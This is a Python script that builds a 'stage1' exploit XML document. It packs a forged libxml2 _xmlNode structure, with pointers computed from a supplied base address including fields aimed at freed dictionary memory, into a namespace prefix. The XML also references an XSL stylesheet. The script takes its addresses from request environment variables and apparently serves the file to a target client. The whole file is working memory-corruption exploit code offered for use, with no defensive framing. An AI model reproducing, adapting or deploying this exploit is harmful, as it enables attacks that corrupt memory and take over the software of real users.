#!/usr/bin/python

# stage1_xml generates the correct XML stage1 exploit document based on
# the base address specified as a parameter

import sys
import os
import struct

class InvalidParameterError(Exception):
    pass

def toascii(data):
    """
    Encodes a 32-bit integer as an ascii string. raises InvalidParameterError
    in case of errors.
    """

    if data > 0xffffffff or data < 0:
        raise InvalidParameterError("Value out of range")

    packed = struct.pack("<I", data)
    
    return packed
    
def stage1_xml(base=0x6b503000, nextaddr=None):
    """
    Generates the exploit XML document. The parameter base must be an integer.
    """

    # Vulnerable string (struct _xmlNode)
    ns = ""
    ns += "XXXX"                # _private
    ns += "YYYY"                # type
    ns += toascii(base + 0x230) # name (DICT_FREE'd)
    ns += toascii(base + 0x130) # children
    ns += "LLLL"                # last
    ns += toascii(base + 0x44)  # parent (must be valid memory, field is zeroed)
    if nextaddr is None:
        ns += toascii(base + 0x44)  # next (field is zeroed)
    else:
        ns += toascii(nextaddr)
    ns += toascii(base + 0x70)  # prev (field is zeroed)
    ns += toascii(base + 0x34)  # doc
    ns += "NNNN"                # ns
    ns += toascii(base + 0x230) # content (DICT_FREE'd)
    ns += "PPPP"                # properties
    ns += "DDDD"                # nsDef
    ns += "pppp"                # psvi
    ns += "ll"                  # line
    ns += "ee"                  # extra

    nsname = "basebandName"
    nsuri = "basebandURI"

    # Generate the document as a string
    
    # NOTE: in order for the exploit to behave correctly, the document
    # element (the element the namespace is defined in) MUST NOT BE on
    # line 1 (here it is on line 3)
    document = ""
    document += '<?xml version="1.0" encoding="UTF-8"?>\n'
    document += '<?xml-stylesheet type="text/xsl" href="stylesheet.xsl"?>\n'
    document += '<{ns}:{nsuri} xmlns:{ns}="{nsname}">roottext<root/></{ns}:{nsuri}>'.format(
        ns=ns, nsname=nsname, nsuri=nsuri
    )
    document += '\n'
    
    return document

# [ Standalone script usage ] ------------------------------------------------ #

def main():
    env = os.environ
    base = env.get('_REQUEST__id')
    nextaddr = env.get('_REQUEST__contentId')
    
    if base is None:
        return

    try:
        base = int(base)
    except ValueError:
        return

    if nextaddr is not None:
        try:
            nextaddr = int(nextaddr)
        except ValueError:
            nextaddr = None

    data = stage1_xml(base, nextaddr)
    sys.stdout.write(data)

if __name__ == "__main__":
    main()
